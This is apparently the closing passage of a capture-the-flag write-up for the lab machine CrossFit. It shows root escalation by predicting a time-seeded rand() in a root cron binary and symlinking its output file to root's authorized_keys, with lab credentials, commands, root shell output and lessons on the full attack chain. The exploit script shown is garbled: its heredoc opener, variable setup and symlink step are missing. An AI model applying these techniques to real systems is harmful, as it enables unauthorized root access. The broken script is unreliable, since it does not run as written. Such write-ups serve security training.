# This program must be run as root.</code></pre><p>Context:&nbsp;<br>A binary that explicitly checks for root and runs on a cron is the ultimate target for privilege escalation.</p><p>&nbsp;<br>"Binaries that say 'must be run as root' are not barriers - they're advertisements. They tell you exactly what they're for. The next step is to figure out how to make root run YOUR data through them."</p><h3 id="step-7-2-reverse-engineering-dbmsg">Step 7.2: Reverse Engineering dbmsg</h3><p>Analyzing dbmsg in Ghidra reveals:</p><pre><code data-language="c">void main(void) {
 uid = geteuid();
 if (uid != 0) {
 fwrite("This program must be run as root.\n",1,0x22,stderr);
 exit(1);
 }
 time_seed = time((time_t *)0x0);
 srand((uint)time_seed);
 process_data();
 exit(0);
}</code></pre><p>The process_data() function:<br>1. Connects to MySQL as crossfit/oeLoo~y2baeni<br>2. Queries SELECT * FROM messages<br>3. Opens /var/backups/mariadb/comments.zip<br>4. For each row:<br>&nbsp;• rand_num = rand()<br>&nbsp;• filename = md5(rand_num + id)<br>&nbsp;• filepath = "/var/local/" + filename<br>&nbsp;• fopen(filepath, "w")<br>&nbsp;• Writes: name + " " + message + " " + email<br>&nbsp;• Adds file to zip<br>5. Deletes DB rows and files</p><p>The Exploit:&nbsp;<br>Since srand(time(NULL)) uses the current Unix timestamp as the seed, the "random" number is predictable. We can:<br>1. Calculate the timestamp when dbmsg will next run (every minute at:01)<br>2. Predict rand() for that timestamp<br>3. Compute the MD5 hash of rand() + id<br>4. Create a symlink at /var/local/[hash] pointing to /root/.ssh/authorized_keys<br>5. Insert our SSH public key into the messages table with the matching id<br>6. When dbmsg runs as root, it fopen()s our symlink, follows it, and writes our SSH key to /root/.ssh/authorized_keys</p><p>&nbsp;<br>"Randomness seeded with time is not random - it's a clock. If you know when a program runs, you know its entropy source. Cryptographers call this a catastrophic failure; attackers call it Tuesday."</p><h3 id="step-7-3-generate-an-ssh-key-pair">Step 7.3: Generate an SSH Key Pair</h3><p>On Kali:</p><pre><code data-language="bash">ssh-keygen -t ed25519 -f /tmp/crossfit_root -N "" -C "root@crossfit"
cat /tmp/crossfit_root.pub</code></pre><p>Result:</p><pre><code data-language="text">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF5APNQ6KSHyFeATLDm52mK+EIOmslITWWsGzcu9oMGx root@crossfit</code></pre><h3 id="step-7-4-build-and-run-the-exploit-script">Step 7.4: Build and Run the Exploit Script</h3><p>On the target (as isaac), create /home/isaac/root.sh:</p><pre><code data-language="bash">#!/bin/bash

#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
#include &lt;stdlib.h&gt;
int main() {
 time_t now = time(NULL);
 time_t next = now - (now % 60) + 61; # Next minute + 1 second
 srand(next);
 printf("%d\n", rand());
 return 0;
}
EOF

rm predict predict.c

FN=$(echo -n "${RAND}${ID}" | md5sum | cut -d' ' -f1)
echo "[+] Predicted filename: /var/local/$FN"

echo "[+] Symlink created"

# dbmsg writes: name + " " + message + " " + email
# For authorized_keys format: ssh-ed25519 &lt;key&gt; &lt;comment&gt;

echo "[*] Exploit window passed. Try SSH as root."</code></pre><p>Run it:</p><pre><code data-language="bash">chmod +x /home/isaac/root.sh
/home/isaac/root.sh</code></pre><p>Critical timing note:&nbsp;<br>A cleanup script on the box periodically deletes files in /tmp, /dev/shm, and /var/local. We compile in /home/isaac and create the symlink in /var/local just before the cron fires. If the symlink is cleaned before dbmsg opens it, the exploit fails. The sleep targets the exact execution window.</p><h3 id="step-7-5-ssh-as-root">Step 7.5: SSH as Root</h3><p>On Kali:</p><pre><code data-language="bash">ssh -i /tmp/crossfit_root root@10.129.5.198</code></pre><p>Result:</p><pre><code data-language="text">root@crossfit:~# id
uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Root flag:</p><pre><code data-language="bash">cat /root/root.txt
# 201d921[redacted]0d2d11a3</code></pre><p>&nbsp;<br>"Arbitrary write as root gives full control. It doesn't matter how complex the path is - if root writes attacker-controlled data to an attacker-chosen location, you own the box. The symlink turns a benign file write into a root compromise."</p><h2 id="key-lessons">Key lessons</h2><p>1. Input Fields Are Not Created Equal<br>The blog comment form had XSS filters. The User-Agent did not. Every field that reaches a privileged viewer is an attack surface.</p><p>2. The Browser Is Your Best Friend<br>A headless browser running as an admin is not a security control - it's a proxy. XSS lets you browse the internal network, submit forms, and steal tokens from the inside.</p><p>3. CORS Is an Enumeration Tool<br>Access-Control-Allow-Origin leaks the existence of subdomains. Trust relationships are discovery vectors.</p><p>4. Chain Simple Primitives<br>XSS → CORS enumeration → CSRF → FTP upload → Webshell → Reverse shell. No single step is complex; the chain is devastating.</p><p>5. Credentials Hide in Config Files<br>Ansible playbooks, PAM configs, and PHP db.php files are useful credential sources. Automation requires hardcoded secrets.</p><p>6. Cron Jobs Are Escalation Paths<br>A script that runs every minute as another user is a free elevator. Find what inputs it consumes and poison them.</p><p>7. Predictable Randomness Is Not Random<br>srand(time(NULL)) is a cryptographic disaster. If you know the execution time, you know the output.</p><p>8. Symlinks Redirect Privilege<br>A symlink in a world-writable directory can turn a low-privilege file creation into a high-privilege file write. Root follows symlinks.</p><p>9. Timing Matters<br>Cleanup scripts, cron jobs, and race conditions are real. The difference between success and failure is often seconds. Prepare everything in advance and execute rapidly.</p><p>10. Do not trust the Surface<br>The default Apache page on crossfit.htb was a lie. The real application lived on gym-club.crossfit.htb. The FTP site was invisible without the right Origin header.
